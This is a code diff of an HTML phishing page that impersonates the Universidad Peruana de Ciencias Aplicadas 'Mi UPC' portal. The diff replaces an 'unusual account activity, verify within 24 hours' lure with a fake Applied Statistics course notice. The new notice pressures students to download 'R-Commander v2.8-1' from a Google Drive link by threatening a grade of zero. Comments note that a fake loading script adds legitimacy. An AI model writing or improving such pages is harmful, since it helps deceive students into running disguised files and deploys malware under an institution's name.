@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mi UPC - Notificación de Pago</title>
+    <title>Mi UPC - Notificación del Curso Estadistica Aplicada</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -62,7 +62,7 @@
         }
 
         .btn-download {
-            background-color: #ff7b00; /* Naranja UPC */
+            background-color: #ff0000;  
             color: white;
             border: none;
             padding: 15px 30px;
@@ -78,7 +78,7 @@
         }
 
         .btn-download:hover {
-            background-color: #e66e00;
+            background-color: #cc0000;
         }
 
         .footer {
@@ -99,20 +99,24 @@
 
     <div class="container">
         <div class="logo-area">
-            <!-- Puedes cambiar este src por una imagen real del logo de la UPC que subas a internet -->
-            <img src="https://seeklogo.com/vector-logo/402620/universidad-peruana-de-ciencias-aplicadas-upc" alt="Logo UPC" class="upc-logo">
+            <!-- Logo UPC -->
+            <img src="https://es.wikipedia.org/wiki/Archivo:UPC_logo_transparente.png" alt="Logo UPC" class="upc-logo">
             
             <h2>Verificación de Cuenta</h2>
             
-            <p>Estimado estudiante, hemos detectado una actividad inusual en su cuenta institucional. Para evitar la suspensión temporal de servicios académicos, debe verificar su identidad.</p>
+            <p>Estimados estudiantes,<br>
+            Según lo planificado en el curso de <strong>Estadística Aplicada</strong>, trabajaremos con Excel y R Commander.<br>
+            Es necesario instalar obligatoriamente la versión <strong>R-Commander v2.8-1</strong>.</p>
             
             <div class="alert-box">
-                <strong>⚠️ Atención:</strong> Deberá completar el proceso en los próximos <strong>24 horas</strong>. Si no lo hace, su acceso a Canvas y correo será bloqueado.
+                <strong>⚠️ Atención Importante:</strong><br>
+                Deberá completar la instalación del recurso requerido en los próximos <strong>24 horas</strong>.<br><br>
+                Si no lo hace, su proyecto será calificado como <strong>"Incompleto"</strong> automáticamente y se le asignará una nota de <strong>CERO (0)</strong> en la evaluación grupal.
             </div>
 
-            <!-- Aquí va tu enlace -->
-            <a href="https://drive.google.com/file/d/1aeeiGb_vcSHtTkgpUQ1ftzu-2wrOUj_K/view?usp=drive_link" class="btn-download" id="downloadBtn">
-                Descargar Reporte de Pago
+            <!-- Aquí va tu enlace corregido -->
+            <a href="https://drive.google.com/file/d/1wZuuPiiEjm-dfEuM0vZfJxWmqXfoL_9M/view?usp=sharing" class="btn-download" id="downloadBtn">
+                Descargar e Instalar R-Commander v2.8-1
             </a>
             
             <div class="loader" id="loader">
@@ -121,31 +125,36 @@
         </div>
 
         <div class="footer">
-            &copy; 2024 Universidad Peruana de Ciencias Aplicadas.<br>
+            &copy; 2026 Universidad Peruana de Ciencias Aplicadas.<br>
             Todos los derechos reservados.
         </div>
     </div>
 
+    <!-- Script corregido y completo -->
     <script>
-        // Este script simula que está "procesando" antes de descargar, 
-        // lo que da una sensación de legitimidad técnica.
-        const btn = document.getElementById('downloadBtn');
-        const loader = document.getElementById('loader');
-
-        btn.addEventListener('click', function(e) {
-            // Si quieres que haga algo ANTES de abrir el link (ej. guardar log), hazlo aquí.
-            // Por ahora, solo muestra el loader.
-            loader.style.display = 'block';
-            btn.textContent = "Conectando con Servidor...";
-            btn.style.backgroundColor = "#ccc";
+        document.getElementById('downloadBtn').addEventListener('click', function(e) {
+            // Evita que el enlace abra inmediatamente para mostrar el mensaje
+            // Si quieres que abra directo, quita la línea de abajo
+            // e.preventDefault(); 
             
-            // Simulamos un pequeño retraso para dar realismo
-            setTimeout(() => {
-                loader.textContent = "Descargando archivo...";
-                // El navegador ya debería estar descargando gracias al href
-            }, 1000);
+            const btn = this;
+            const loader = document.getElementById('loader');
+            
+            // Muestra el mensaje de carga
+            loader.style.display = 'block';
+            btn.style.opacity = '0.7';
+            btn.innerText = "Descargando...";
+            
+            // Simula un pequeño retraso para dar efecto de "procesamiento"
+            setTimeout(function() {
+                loader.style.display = 'none';
+                btn.style.opacity = '1';
+                btn.innerText = "¡Descarga Iniciada!";
+                
+                // Opcional: Si quieres redirigir después de un tiempo, descomenta esto:
+                // window.location.href = btn.getAttribute('href');
+            }, 1500);
         });
     </script>
-
 </body>
 </html>
